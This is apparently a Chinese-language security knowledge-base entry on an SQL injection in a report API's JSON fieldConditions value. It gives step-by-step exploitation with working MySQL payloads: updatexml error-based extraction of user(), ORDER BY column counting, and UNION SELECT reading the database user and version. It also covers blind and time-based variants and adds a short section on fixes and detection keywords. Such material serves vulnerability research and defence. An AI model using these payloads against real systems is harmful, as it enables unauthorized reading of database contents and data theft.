---
id: web-generic-sqli-json-fieldconditions-value-updatexml-union
title: 报表 fieldConditions.value 拼接 SQL：updatexml 报错 + union 四列注出 user()/version()
type: scenario
domain: web
path: web/generic/sqli
technique: json-fieldconditions-value-sqli-updatexml-union
aliases:
- fieldConditions 注入
- 报表条件注入
- JSON 条件数组 SQL 注入
- updatexml 报错注入
- union 四列回显
- DATE_FORMAT 拼接注入
tags:
- web
- sqli
- json
- report
- mysql
- updatexml
- union
- error-based
- code-audit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V231
  verified_at: '2026-11-07T09:49:07+08:00'
  notes: 已对照原文与图37-48核对：fieldConditions[].value 进入 DATE_FORMAT('...','%Y-%m-%d')；非法值回显完整 SQL（error 1105）；updatexml 报错注入 user()；union select 1,user(),version(),4 回显 D3=root@...、D4=5.7.99。payload 按截图还原；未复跑。
---

## 一句话结论

报表/查询接口把 JSON 请求中的 `fieldConditions[].value` 直接拼进 SQL（如 `DATE_FORMAT('<value>','%Y-%m-%d')`），没有参数化；先用非法输入让接口在错误信息里回显完整 SQL，确认注入上下文后用 `updatexml(1,concat(0x7e,(select user()),0x7e),1)` 报错注入，再用 `union select 1,user(),version(),4` 确认 4 列全部回显，读出数据库用户 `root@...` 与版本 `5.7.99`，形成完整的报错 + 联合查询注入链。

## 原理

- 该系统的报表查询由前端提交一个 JSON 条件数组：`fieldConditions: [{option:"=", value:["2025-06-16"], fieldId:"...", isDimensionName:false}, ...]`，后端按 `fieldId`/`option` 拼 SQL，`value` 直接进入 `WHERE t_1.record_day = DATE_FORMAT('<value>','%Y-%m-%d')` 这类表达式，未使用预编译占位符。
- 错误回显：当 `value` 为 `2025-06-16' seeeeeeasdasd` 等非法内容时，MySQL 报 `SQL syntax error ... error code [1105]`，响应 `desc` 字段带出完整 SQL（含 `SELECT ... FROM eb_mashang... DATE_FORMAT(...) ... ORDER BY ... LIMIT 0,10`）；这既确认注入点，也帮助攻击者构造闭合与后续 payload。
- 报错注入：MySQL `updatexml()` 的第二个参数要求合法 XPath，传入 `concat(0x7e,(select user()),0x7e)` 会触发 `XPATH syntax error`，把 `user()` 结果带进错误信息；同理可读 `database()`、`version()`、表名等。
- 联合查询：先 `ORDER BY 4` 判断子查询有 4 列（`ORDER BY 5` 报错），再用 `union select 1,user(),version(),4` 让 4 列全部回显；响应 JSON 的 `D3`/`D4` 等字段分别对应 `user()` 与 `version()`，证明数据被带出。
- 为什么成立：报表框架为了支持动态字段/排序，把结构（字段名、条件、排序）当 SQL 片段拼接，而 `value` 是用户数据却未参数化；加上错误信息未脱敏、查询被包成 `SELECT * FROM (...) AS dataTable` 便于 union，三个条件叠加形成完整注入。

## 触发条件

- 目标为使用该报表/查询框架的系统，接口接受 `fieldConditions`/`fieldId`/`option`/`value` 等 JSON 参数。
- `value` 被拼进 SQL 值位置（如 `DATE_FORMAT`/`WHERE`/`LIKE`），没有预编译或严格类型校验。
- 数据库为 MySQL（`updatexml`/`extractvalue` 可用），或可换成对应数据库的报错函数。
- 接口返回数据库错误信息（`desc`/`message` 含 SQL 片段），便于确认注入上下文。
- 子查询列数可通过 `ORDER BY n` 判断，且 `union` 结果能回显到响应字段。

## 利用步骤

1. 从系统前端 JS/页面找到报表/查询接口，提交任意条件，观察它自动加载的 JSON 查询请求（`fieldConditions` 数组、`numberPerPage`、排序字段等）。
2. 在 `fieldConditions[0].value` 中插入单引号或非法串（如 `2025-06-16' seeeeeeasdasd`），读取错误响应中的完整 SQL，确认 `value` 落在 `DATE_FORMAT('...','%Y-%m-%d')` 内。
3. 用 `2025-06-16' and updatexml(1,concat(0x7e,(select user()),0x7e),1)--` 触发报错注入，确认 `user()` 被带出。
4. 用 `2025-06-16', '%Y-%m-%d') AND t_1.id = '11') AS dataTable ORDER BY 4 ASC LIMIT 0,10--` 判断列数；`ORDER BY 5` 报错即 4 列。
5. 用 `2025-06-16', '%Y-%m-%d') AND t_1.id = '11') AS dataTable union select 1,user(),version(),4 ORDER BY 1 LIMIT 0,10--` 联合查询；响应 `D3`/`D4` 分别显示 `root@...` 与 `5.7.99`。
6. 继续 union/报错读取 `database()`、表名、列名与业务数据；若 union 被拦，退回报错注入或布尔/时间盲注。

## PoC

原文 JSON 条件结构（字段名与值取自截图）：

```json
{
  "fieldConditions": [
    {
      "option": "=",
      "value": ["2025-06-16' and updatexml(1,concat(0x7e,(select user()),0x7e),1)--"],
      "fieldId": "dalcba4f9d0b454285b10b8e84cc1d11",
      "isDimensionName": false
    }
  ],
  "numberPerPage": 10
}
```

```text
# 1) 非法值触发 SQL 回显（原文）
value = "2025-06-16' seeeeeeasdasd"
响应 desc 含：
... WHERE t_1.record_day = DATE_FORMAT('2025-06-16' seeeeeeasdasd,'%Y-%m-%d') AND t_1.id = '11' ...
SQL state [HY000]; error code [1105]
```

```text
# 2) 判断列数 / 联合查询（原文）
value = "2025-06-16', '%Y-%m-%d') AND t_1.id = '11') AS dataTable ORDER BY 4 ASC LIMIT 0,10--"
value = "2025-06-16', '%Y-%m-%d') AND t_1.id = '11') AS dataTable union select 1,user(),version(),4 ORDER BY 1 LIMIT 0,10--"

响应 data 示例：
{"D4":"5.7.99","M0":1,"D1":4,"D3":"root@<host>"}
```

说明：原文对目标域名/部分字段打码；payload 结构按截图还原，实际测试需按目标 SQL 的闭合方式调整引号与括号。

## 变体与关联

- 变体（注入位置）：`fieldConditions[].value` 之外，`option`、`fieldId`、排序字段、`numberPerPage` 等若进入 SQL 结构也可能注入；优先测 `value`，再测标识符位置。
- 变体（数据库）：MySQL 用 `updatexml`/`extractvalue`/`floor`；SQL Server 用 `CONVERT`/`CAST`；Oracle/PostgreSQL 用类型错误函数。
- 变体（无回显）：union 被过滤时用报错注入；报错也被拦时用布尔/时间盲注（`if(...,sleep(n),0)`），注意 WAF 对逗号/sleep 的拦截。
- 关联：[[web-generic-sqli-error-based-extraction]]（报错注入方法）、[[web-generic-sqli-java-identifier-table-order-by-injection]]（标识符位置注入）、[[web-generic-sqli-ordertype-hpp-parameter-pollution-time-blind]]（同文章的第二种 SQLi）。
- 边界：后端改为预编译/白名单 `fieldId`、关闭 SQL 错误回显、过滤 `union`/`updatexml` 时，需换其他注入技术；原文仅在授权 SRC 测试。

## 检测与防御

- 修复：所有值位置使用预编译参数；`fieldId`/`option`/排序字段使用服务端白名单映射，禁止把客户端字符串拼进 SQL；对 `value` 做类型/格式校验（日期、数字、枚举）。
- 加固：关闭生产环境 SQL 错误回显，统一错误页；数据库账号最小权限（避免 root）；WAF 拦截 `updatexml`/`extractvalue`/`union select`/`sleep` 等特征，但不要依赖 WAF 作为唯一防线。
- 检测：报表接口请求中出现单引号、注释符、`updatexml`、`extractvalue`、`union select`、`sleep`、`information_schema` 等；响应出现 SQL 语法错误/错误码；同一账号高频变更 `fieldConditions`/排序参数。
- 审计：搜索报表/查询框架中 `fieldConditions`、`DATE_FORMAT(`、字符串拼接 SQL 的代码，检查是否使用 `PreparedStatement`/MyBatis `#{}`；对动态表名/列名做白名单。
